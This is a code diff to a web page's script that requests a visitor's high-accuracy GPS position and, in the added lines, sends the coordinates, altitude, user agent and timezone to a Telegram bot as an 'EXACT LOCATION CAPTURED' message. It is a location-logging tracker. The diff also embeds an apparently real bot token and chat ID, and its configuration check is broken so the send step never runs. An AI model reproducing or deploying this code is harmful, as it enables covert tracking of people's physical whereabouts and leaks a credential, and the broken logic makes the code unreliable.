@@ -15,30 +15,24 @@
 <pre id="locationOutput">Waiting...</pre>
 
 <script>
-    // Technical comment: This script requests high-accuracy GPS via HTML5 Geolocation API.
-    // Coordinates are sent to a remote server via POST. Server endpoint must be set.
-    const SERVER_ENDPOINT = "https://your-server.com/log_location.php"; // Replace with actual server URL
+    // === CONFIGURATION ===
+    // REPLACE THESE WITH YOUR REAL TELEGRAM BOT TOKEN AND CHAT ID
+    const TELEGRAM_BOT_TOKEN = "8650736921:AAH7qZokqXqR530EQ7ZsT-HxRQcmcLQ5t-E";
+    const TELEGRAM_CHAT_ID = "8577571897";
+    // =====================
 
-    function sendToServer(lat, lng, acc, alt, altAcc, heading, speed, timestamp) {
-        let payload = {
-            latitude: lat,
-            longitude: lng,
-            accuracy: acc,
-            altitude: alt,
-            altitudeAccuracy: altAcc,
-            heading: heading,
-            speed: speed,
-            timestamp: timestamp,
-            userAgent: navigator.userAgent,
-            screenRes: `${screen.width}x${screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-        };
-        fetch(SERVER_ENDPOINT, {
+    function sendToTelegram(lat, lng, acc, alt, timestamp, userAgent, timezone) {
+        if (TELEGRAM_BOT_TOKEN === "8650736921:AAH7qZokqXqR530EQ7ZsT-HxRQcmcLQ5t-E" || TELEGRAM_CHAT_ID === "8577571897") {
+            console.log("Telegram not configured - location data below:");
+            return false;
+        }
+        let message = `📍 EXACT LOCATION CAPTURED\nLatitude: ${lat}\nLongitude: ${lng}\nAccuracy: ±${acc} meters\nAltitude: ${alt !== null ? alt : "N/A"} m\nTimestamp: ${timestamp}\nUser Agent: ${userAgent}\nTimezone: ${timezone}\nMaps: https://www.google.com/maps?q=${lat},${lng}`;
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             method: 'POST',
-            mode: 'no-cors', // if CORS not configured, use no-cors (data still sent but response hidden)
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        }).catch(e => console.log(e));
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+        }).catch(err => console.log("Send error:", err));
+        return true;
     }
 
     document.getElementById('getLocationBtn').addEventListener('click', function() {
@@ -47,7 +41,7 @@
             return;
         }
         let options = {
-            enableHighAccuracy: true,   // Forces GPS if available
+            enableHighAccuracy: true,
             timeout: 10000,
             maximumAge: 0
         };
@@ -56,16 +50,15 @@
             let lat = coords.latitude;
             let lng = coords.longitude;
             let acc = coords.accuracy;
-            let alt = coords.altitude !== null ? coords.altitude : "N/A";
-            let altAcc = coords.altitudeAccuracy !== null ? coords.altitudeAccuracy : "N/A";
-            let heading = coords.heading !== null ? coords.heading : "N/A";
-            let speed = coords.speed !== null ? coords.speed : "N/A";
-            let ts = pos.timestamp;
+            let alt = coords.altitude;
+            let ts = new Date(pos.timestamp).toISOString();
+            let ua = navigator.userAgent;
+            let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-            let output = `EXACT LOCATION:\nLatitude: ${lat}\nLongitude: ${lng}\nAccuracy: ±${acc} meters\nAltitude: ${alt} m\nAltitude Accuracy: ±${altAcc} m\nHeading: ${heading}°\nSpeed: ${speed} m/s\nTimestamp: ${new Date(ts).toISOString()}\n\nGoogle Maps: https://www.google.com/maps?q=${lat},${lng}`;
+            let output = `EXACT LOCATION:\nLatitude: ${lat}\nLongitude: ${lng}\nAccuracy: ±${acc} meters\nAltitude: ${alt !== null ? alt : "N/A"} m\nTimestamp: ${ts}\n\nGoogle Maps: https://www.google.com/maps?q=${lat},${lng}`;
             document.getElementById('locationOutput').innerText = output;
 
-            sendToServer(lat, lng, acc, alt, altAcc, heading, speed, ts);
+            sendToTelegram(lat, lng, acc, alt, ts, ua, tz);
         }
         function error(err) {
             let msg = "";
